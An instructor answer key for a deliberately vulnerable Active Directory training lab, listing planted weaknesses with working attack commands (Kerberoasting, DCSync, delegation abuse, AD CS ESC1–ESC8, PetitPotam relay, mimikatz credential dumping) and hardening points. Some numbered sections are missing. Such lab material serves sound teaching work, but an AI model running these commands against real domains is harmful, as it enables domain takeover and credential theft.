Phantom AD — Instructor Answer Key & Attack-Path Map

Environment: phantom.local · single Domain Controller · Windows Server 2016 · Build seed 1337 Design by Emre Koybaşı

Instructor-side answer key for the Phantom AD lab produced by PhantomCorp.ps1. For every planted weakness: what the script builds, where to find it, why the weakness exists, and how to exploit it — against the exact configuration the builder produces. The build is deterministic: every student gets the same users, passwords, and group memberships. Exact randomized identities are written to generate.log and VulnAD_Lab_Report.txt (Desktop).

Setup — provision the DC first (run before the lab script)

PhantomCorp.ps1 does not create the domain; it configures an existing phantom.local DC. Start from a clean Windows Server 2016 (build 14393.693, Windows Update OFF from first boot). Do every step in an elevated PowerShell, in order.

Step 1 — Rename the machine to DC1 (before promotion). It reboots.

Rename-Computer -NewName "DC1" -Restart -Force

Step 2 — After reboot, confirm the name is DC1.

hostname   # must print: DC1

Step 3 — Install AD DS and create the forest (reboots automatically). The DSRM password set here is the one the DSRM persistence scenario uses — keep it as shown.

Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

Install-ADDSForest `
  -DomainName "phantom.local" `
  -DomainNetbiosName "PHANTOM" `
  -InstallDns `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "DSRMpass123!" -AsPlainText -Force) `
  -Force

Step 4 — (Optional) place a vulnerable HFS build for CVE-2014-6287. Download Rejetto HFS 2.3 / 2.3b (NOT 2.3c or 2.3m — those are patched) and copy it to C:\HFS\hfs.exe. If you skip this, that one CVE is skipped and everything else still builds.

Step 5 — After reboot, run the lab script once on the DC (elevated).

cd C:\path\to\script
.\PhantomCorp.ps1

Run it once on a clean DC — the build is not idempotent. It seeds everything deterministically (seed 1337), writes the cheat sheet to C:\VulnAD-Build, then reboots in 30 seconds.

Step 6 — Before exporting the VM for students:

  1. Copy C:\VulnAD-Build somewhere safe — it holds generate.log and VulnAD_Lab_Report.txt with every planted password.
  2. Delete C:\VulnAD-Build so students cannot read it.
  3. Take a VM snapshot — Zerologon resets the DC machine password when a student runs it, so you need a clean restore point.
  4. Export as OVA/VHDX. Every student gets the identical lab (same users, passwords, SIDs frozen in the image).

This build (14393.693): below the MS17-010 fix (14393.953) and below the Zerologon fix (14393.3866), so both EternalBlue and Zerologon are exploitable. Keep Windows Update OFF and never patch the exported VM, or these two drop out of scope. Company name in all documents: Phantom Corp.

2. Reconnaissance (unauthenticated)

nxc smb <DC-IP> -u '' -p '' --shares
smbclient -N //<DC-IP>/Common      # -> IT-Notices\Deployment_Runbook_DRAFT.txt (svc_deploy), Employee_Onboarding_Guide.txt (pattern)
nxc ldap <DC-IP> -u '' -p '' --users

Why it happens: the DC is configured to accept anonymous LDAP binds and null-session share access (EveryoneIncludesAnonymous=1, NullSessionShares). No credential is needed to inventory the whole directory.

3. Initial access

  1. svc_deploy / Deploy2024! (runbook, or Winlogon autologon post-foothold).
  2. WS-INTAKE$ / ws-intake (machine password == sam stem).
  3. Password spray: <domain-prefix> + 3 digits (e.g. phantom042) — several Marketing/Sales/Accounting users share it. One attempt per account, respect the 1-min window.
nxc ldap <DC-IP> -u svc_deploy -p 'Deploy2024!' --bloodhound -c all --dns-server <DC-IP>

Why it happens: credentials are stored in plaintext where any reader can reach them (a shared runbook, the Winlogon registry), and a predictable default-password convention lets a single guess unlock multiple accounts.

5. Roasting

5.1 Kerberoasting

Three RC4-only SPN users with weak passwords, each in a random mid-tier group.

Account SPN
mssql_svc mssql_svc/mssqlserver.phantom.local
http_svc http_svc/httpserver.phantom.local
exchange_svc exchange_svc/exserver.phantom.local 
impacket-GetUserSPNs phantom.local/svc_deploy:'Deploy2024!' -dc-ip <DC-IP> -request
hashcat -m 13100 kerb.hash rockyou.txt

Why it happens: by Kerberos design, any domain user can request a TGS ticket for any account that has an SPN, and that ticket is encrypted with the account's password hash. Here the accounts have weak passwords and are forced to RC4 (msDS-SupportedEncryptionTypes=4), so the ticket cracks offline quickly.

5.2 AS-REP Roasting

1–5 random Marketing/Sales/Accounting users with DONT_REQ_PREAUTH + weak passwords (generate.log → AS-REPRoasting <user>).

impacket-GetNPUsers phantom.local/ -dc-ip <DC-IP> -usersfile users.txt -no-pass
hashcat -m 18200 asrep.hash rockyou.txt

Why it happens: Kerberos pre-authentication is disabled on these accounts (DONT_REQ_PREAUTH), so the KDC returns an AS-REP encrypted with the user's password without verifying identity first. A weak password then cracks offline.

6. ACL abuse and DCSync

6.1 Control edges

VulnAD-Acls plants group→group edges (GenericAll/GenericWrite/WriteOwner/WriteDACL/Self) across tiers; VulnAD-BadAcls chains from an initial-access user (GenericAll over a target) up the tiers.

net rpc password "<victim>" "NewPass1!" -U phantom.local/<attacker>%<pass> -S <DC-IP>

Why it happens: principals were granted excessive rights over other objects. GenericAll/WriteDACL/WriteOwner/GenericWrite let you reset the target's password, take ownership, or stage a targeted attack (Kerberoast / Shadow Credentials) — control chains until it reaches something privileged.

6.2 DCSync

End of the chain: VulnAD-DCSync grants an account Replicating Directory Changes (All / In Filtered Set) on the domain (generate.log → DCSync granted -> <acct> (<group>)).

impacket-secretsdump phantom.local/<acct>:'<pass>'@<DC-IP>

Why it happens: the "Replicating Directory Changes" rights let a principal impersonate DC-to-DC replication and pull every password hash (including krbtgt). Granting them to a non-DC account = full domain compromise.

7. Delegation

7.1 RBCD

FILESRV$ computer created; a random IT Helpdesk user has GenericWrite over it.

impacket-rbcd -delegate-to 'FILESRV$' -delegate-from 'ATTACKER$' -action write phantom.local/<user>:'<pass>'
impacket-getST -spn cifs/FILESRV.phantom.local -impersonate Administrator 'phantom.local/ATTACKER$:<pass>'

Why it happens: GenericWrite over a computer lets you write msDS-AllowedToActOnBehalfOfOtherIdentity, configuring Resource-Based Constrained Delegation to a machine you control — then S4U gets a ticket as anyone (Administrator) to that computer.

7.2 Constrained delegation + protocol transition

websvc / Websvc@2024! has msDS-AllowedToDelegateTo = CIFS/LDAP/HOST of the DC with TrustedToAuthForDelegation.

impacket-getST -spn CIFS/DC1.phantom.local -impersonate Administrator phantom.local/websvc:'Websvc@2024!' -dc-ip <DC-IP>
export KRB5CCNAME=Administrator.ccache && impacket-secretsdump -k -no-pass DC1.phantom.local

Why it happens: the account is trusted to delegate to DC services, and protocol transition (TrustedToAuthForDelegation) lets it request tickets as any user to those services without that user ever authenticating. Since you know its password, you S4U straight to CIFS/DC as Administrator.

7.3 Unconstrained delegation (enum/theory)

SRV-LEGACY01$ is TRUSTED_FOR_DELEGATION.

Why it happens: any authentication to an unconstrained-delegation host caches the caller's TGT on that host. Paired with a coercion, you force the DC to authenticate and capture its TGT. Present here for enumeration + theory.

8. AD CS

8.1 ESC1 — ESC1Template

ENROLLEE_SUPPLIES_SUBJECT, Domain Users enroll, Client Authentication.

certipy req -u <user>@phantom.local -p '<pass>' -dc-ip <DC-IP> -ca <CA-NAME> -template ESC1Template -upn administrator@phantom.local
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>

Why it happens: the template lets the requester supply their own SAN (ENROLLEE_SUPPLIES_SUBJECT) and permits low-priv enrollment for an auth-capable certificate. So any user requests a cert with SAN=Administrator and authenticates (PKINIT) as that user.

8.2 ESC4 — template ACL

A random Normal-tier group holds WriteDACL over ESC1Template.

Why it happens: write access to the template's DACL means the group can re-enable the ESC1 conditions (or any dangerous setting) even after remediation.

8.3 ESC6 — CA flag

EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on the CA.

Why it happens: this CA flag makes every enrollable template honor an attacker-supplied SAN — so even a benign template can be used to impersonate Administrator.

8.4 ESC7 — CA role ACL

A random Normal-tier group has ManageCA + ManageCertificates.

Why it happens: CA-management rights let the group enable vulnerable templates, approve pending requests, or add enrollment agents — administrative control of the PKI.

8.5 ESC8 — Web Enrollment relay

HTTP Web Enrollment + LDAP signing/channel binding not enforced.

Why it happens: the CA's HTTP enrollment endpoint accepts NTLM, and signing isn't enforced, so a coerced DC authentication can be relayed to /certsrv to obtain a DC certificate → DCSync. (No LLMNR/broadcast poisoning is used — the trigger is coercion.)

8.6 Certifried (CVE-2022-26923)

MAQ=10 + Enterprise CA (generate.log → READY).

certipy account create -u <user>@phantom.local -p '<pass>' -dc-ip <DC-IP> -user 'EVIL$' -pass 'Evil1234!' -dns DC1.phantom.local
certipy req -u 'EVIL$'@phantom.local -p 'Evil1234!' -dc-ip <DC-IP> -ca <CA-NAME> -template Machine
certipy auth -pfx dc01.pfx -dc-ip <DC-IP>

Why it happens: MachineAccountQuota>0 lets any user create a computer account, and its dNSHostName can be set to the DC's FQDN. The CA then issues a machine certificate the KDC maps to the DC identity.

8.7 Shadow Credentials

A random IT Helpdesk user has GenericWrite over a random IT Admins user.

pywhisker -d phantom.local -u <low> -p '<pass>' --target <high> --action add
certipy auth -pfx <high>.pfx -dc-ip <DC-IP>

Why it happens: GenericWrite lets you write the target's msDS-KeyCredentialLink (add your own key), then PKINIT as that target — no password reset needed, quieter than force-change.

9. Coercion (relay source)

Print Spooler (MS-RPRN / PrinterBug) + MS-EFSRPC (PetitPotam) exposed.

impacket-ntlmrelayx -t http://<DC-IP>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
python3 PetitPotam.py <ATTACKER-IP> <DC-IP>     # or printerbug.py

Why it happens: MS-RPRN/MS-EFSRPC expose RPC methods that make a remote host authenticate back to an attacker-chosen target. That authentication can be relayed (e.g. to ESC8).

Vector Detail

Why it happens: unquoted path — Windows splits a space-containing path and runs your exe from a writable intermediate folder. AlwaysInstallElevated — the policy installs any .msi as SYSTEM. Writable task — a SYSTEM task's script sits in a world-writable path. GPP cpassword — Microsoft published the fixed AES key, so the SYSVOL cpassword is trivially decryptable. LAPS-style — the local-admin password sits in a readable attribute a low-tier group can read.

11.5 Credentials in memory (Mimikatz / C2 payoff)

On a client-less lab nobody ever logs on, so sekurlsa::logonpasswords would normally return nothing. A privileged service account is therefore made to log on continuously — the classic real-world finding of a Domain Admin service account running a job on a server.

PlantDetail
Accountsvc_backupadm / Backup#Adm2024! — member of Domain Admins, password never expires
Why it is in memoryScheduled task BackupReportJob runs as that account every 10 minutes
WDigestUseLogonCredential=1 → plaintext credentials cached in LSASS
LSA secretsThe task's stored password is written to LSA secrets (independent of timing)
 
# after getting SYSTEM on the DC (local privesc / WinRM / HFS), from an Empire/Havoc agent:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords      # plaintext, thanks to WDigest
mimikatz # lsadump::secrets              # scheduled-task password, timing-independent
# or remotely once you are already admin:
impacket-secretsdump -sam -security -system LOCAL -ntds-history phantom.local/<admin>@<DC-IP>

Why it happens: a service account was given Domain Admin rights and used to run a scheduled job on a domain controller. Every time the job runs, that account authenticates on the box, so its credentials sit in LSASS; registering the task also stores the password in LSA secrets. WDigest being re-enabled turns the cached credential into recoverable plaintext. Anyone who reaches SYSTEM on that one host inherits Domain Admin.

Why it happens: each is an over-privileged or backdoor configuration. Backup/Server Operators can read or run code on the DC by design. AdminSDHolder — GenericAll there is re-applied to every protected group by SDProp (durable). DSRM — the local admin becomes usable over the network via Pass-the-Hash.

13. Suggested kill-chains

  1. Docs → foothold → roast → DA: null-session share → svc_deploy → Kerberoast → crack → ACL chain → DCSync.
  2. CA path: any user → ESC1 (SAN=Administrator) → PKINIT → DCSync. (Or Certifried / ESC6 / ESC7.)
  3. Delegation path: websvc → S4U to CIFS/DC as Administrator → secretsdump.
  4. Coercion path: PetitPotam/PrinterBug → relay to ESC8 → DC certificate → DCSync.
  5. DnsAdmins path: Common\DNSrestart.ps1 breadcrumb → <dnsadmin_user> → serverlevelplugindll → SYSTEM.

14. Blue-team talking points

Each plant maps to a hardening lesson: enforce SMB/LDAP signing and channel binding; disable NTLMv1/SMBv1; remove EDITF_ATTRIBUTESUBJECTALTNAME2 and lock down template enrollment/ACLs; set MachineAccountQuota=0; audit DnsAdmins, Backup/Server Operators, AdminSDHolder, and outbound-control ACL edges with BloodHound; patch Zerologon/EternalBlue; remove GPP cpassword and world-readable shares; never store credentials in autologon, SYSVOL, or shared documentation.
